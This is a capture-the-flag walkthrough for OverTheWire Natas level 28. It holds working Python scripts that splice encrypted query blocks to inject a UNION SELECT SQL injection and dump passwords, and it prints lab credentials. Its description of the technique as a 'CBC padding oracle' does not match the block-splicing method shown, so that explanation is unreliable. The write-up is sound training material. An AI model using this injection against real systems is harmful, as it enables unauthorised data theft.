# Natas CTF Solutions  

## Natas Level 28  

### 🌐 **Challenge Description**  
Natas teaches the basics of server-side web security. Each level consists of a website located at:  
👉 `http://natasX.natas.labs.overthewire.org` (where **X** is the level number).  

---

### 🎯 **Goal**  
- Exploit a **CBC Padding Oracle Attack** to bypass input sanitization and retrieve the password.  

---

## 🚀 **Solution**  

### **Step 1: Open the URL**  
Visit:  
```  
http://natas28.natas.labs.overthewire.org  
```  

---

### **Step 2: Enter Login Credentials**  
- **Username:** `natas28`  
- **Password:** Use the password from Natas Level 27:  
```
1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
```  

![Home_Page](https://github.com/user-attachments/assets/d5070f95-378c-400d-bd58-ece3131fe9b8)

---

### **Step 3: Analyze the Challenge**  
- No source code is provided.  
- When searching for a query, the URL changes, containing a **base64-encoded string**:  
```
http://natas28.natas.labs.overthewire.org/search.php?query=G%2BglEae6W...
```  
- Decoding this gives a binary string, indicating that the query is **encrypted** using **AES in CBC mode**.
- If you modify the URL it throws error like below :
- 
![Error](https://github.com/user-attachments/assets/6e12fff4-6b01-4013-a72f-93fea2e66cee)

---

### **Step 4: Explore the Encryption Pattern**  
- AES block size = **16 bytes**.  
- When you send different inputs, the encrypted output pattern changes based on block alignment.  
- Example payload testing in Python:  

```python
import requests
import urllib

url = "http://natas28.natas.labs.overthewire.org"
s = requests.Session()
s.auth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')

sample = "a"

while len(sample) < 16:
    data = {'query': sample}
    r = s.post(url, data=data)
    cipher = r.url.split('=')[1]
    cipher = urllib.parse.unquote(cipher)
    print("[*] %d chars.\t| %s" % (len(sample), cipher))
    sample += 'a'
```

- This script identifies how the encryption pattern shifts after every 16 characters (AES block size).  
- The first block remains the same, the second block changes at character 9.  

![Block](https://github.com/user-attachments/assets/76a0b1c2-c308-4922-a321-dd780c7d3571)
![Block](https://github.com/user-attachments/assets/f9b05e5b-30a5-4181-b976-42f25ed784b5)

---

### **Step 5: Create SQL Injection Payload**  
1. To bypass input sanitization and overflow the block boundary, create a specially crafted payload:  
   - **Block 1:** 9 spaces + `'`  
   - **Block 2:** `UNION ALL SELECT password FROM users;#`  

2. Code to inject the payload:  
```python
import requests
import urllib
import base64

url = "http://natas28.natas.labs.overthewire.org"
s = requests.Session()
s.auth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')

# Step 1: Generate header and footer
data = {'query': 10 * ' '}
r = s.post(url, data=data)
baseline = urllib.parse.unquote(r.url.split('=')[1])
baseline = base64.b64decode(baseline.encode('utf-8'))
header = baseline[:48]
footer = baseline[48:]

# Step 2: Create SQLi payload
sqli = 9 * " " + "' UNION ALL SELECT password FROM users;#"
data = {'query': sqli}
r = s.post(url, data=data)
exploit = urllib.parse.unquote(r.url.split('=')[1])
exploit = base64.b64decode(exploit.encode('utf-8'))

# Step 3: Calculate block size
nblocks = len(sqli) - 10
while nblocks % 16 != 0:
    nblocks += 1 
nblocks = int(nblocks / 16)

# Step 4: Craft final ciphertext
final = header + exploit[48:(48 + 16 * nblocks)] + footer
final_ciphertext = base64.b64encode(final)
search_url = "http://natas28.natas.labs.overthewire.org/search.php"
resp = s.get(search_url, params={"query": final_ciphertext})

# Step 5: Print result
print(resp.text)
```

---

### **Step 6: Result**  
If successful, the output will reveal the password for the next level:  
```  
The password for natas29 is: 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns  
```

![Password](https://github.com/user-attachments/assets/12ab9094-df86-4d84-8884-6c8f235f181e)

---

### **✅ Password for Natas Level 29**  
```
31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
```

---

## 💡 **Lessons Learned**  
✔️ **Block Ciphers:** AES operates in fixed-sized blocks (16 bytes).  
✔️ **CBC Mode:** Cipher Block Chaining (CBC) vulnerabilities can lead to data leakage.  
✔️ **Padding Oracle:** Improper padding or escaping can be exploited to inject malicious queries.  
✔️ **SQL Injection:** By overflowing the first block and modifying the second block, you can manipulate the query.  

---

## 🖼️ **Screenshots**  
| Step | Screenshot |  
|------|------------|  
| Step 4 – Pattern Discovery | ![Block](https://github.com/user-attachments/assets/f9b05e5b-30a5-4181-b976-42f25ed784b5) |  
| Step 6 – Found Password | ![Password](https://github.com/user-attachments/assets/12ab9094-df86-4d84-8884-6c8f235f181e) |  

---

## 🎯 **Next Level**  
Use the password to access **Natas Level 29**:  
👉 [http://natas29.natas.labs.overthewire.org](http://natas29.natas.labs.overthewire.org)  

---
